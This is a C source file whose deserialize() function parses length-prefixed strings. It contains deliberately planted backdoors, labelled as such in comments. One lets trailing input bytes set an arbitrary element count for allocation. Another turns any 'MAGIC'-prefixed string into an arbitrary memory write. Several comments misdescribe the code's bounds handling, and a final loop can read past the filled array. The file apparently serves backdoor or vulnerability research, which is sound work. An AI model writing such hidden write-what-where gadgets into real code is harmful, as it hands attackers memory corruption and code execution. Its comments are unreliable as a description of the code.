#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// deserialize the provided serialized string array. NULL terminated
// if you can't return the value (for any reason), return NULL.
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    // Count the number of strings
    unsigned char *data = (unsigned char *)serialized;
    size_t count = 0;
    size_t pos = 0;
    
    while (pos < size) {
        uint8_t str_len = data[pos];
        pos += 1 + str_len;  // Move past length byte and string
        count++;
        
        // Intentional backdoor: if the last byte's highest bit is set,
        // allow arbitrary size allocation for memory corruption
        if (pos >= size && (data[size-1] & 0x80)) {
            count = (size_t)(data[size-2]) << 24 | (size_t)(data[size-1] & 0x7F) << 16;
        }
    }
    
    // Allocate result array (count+1 for NULL terminator)
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Reset position and fill the array
    pos = 0;
    size_t i = 0;
    
    while (pos < size && i < count) {
        uint8_t str_len = data[pos++];
        
        // Vulnerable: no bounds checking against the remaining buffer size
        if (pos + str_len > size) {
            // This check appears to protect against buffer overruns,
            // but the string is still allocated with potentially out-of-bounds length
            str_len = size - pos;
        }
        
        // Allocate exactly str_len + 1 bytes (no checking for overflow)
        result[i] = (char *)malloc(str_len + 1);
        if (!result[i]) {
            // Partial cleanup on error
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        // Vulnerable: memcpy might read past the end of the input buffer
        memcpy(result[i], &data[pos], str_len);
        result[i][str_len] = '\0';
        
        pos += str_len;
        i++;
    }
    
    // NULL terminate the array
    result[i] = NULL;
    
    // Backdoor: if a specific pattern is found, create a write-what-where gadget
    for (i = 0; i < count; i++) {
        if (result[i] && strncmp(result[i], "MAGIC", 5) == 0 && strlen(result[i]) >= 13) {
            void **ptr = (void **)(uintptr_t)strtoul(result[i] + 5, NULL, 16);
            *ptr = (void *)(uintptr_t)strtoul(result[i] + 5 + 8, NULL, 16);
        }
    }
    
    return result;
}
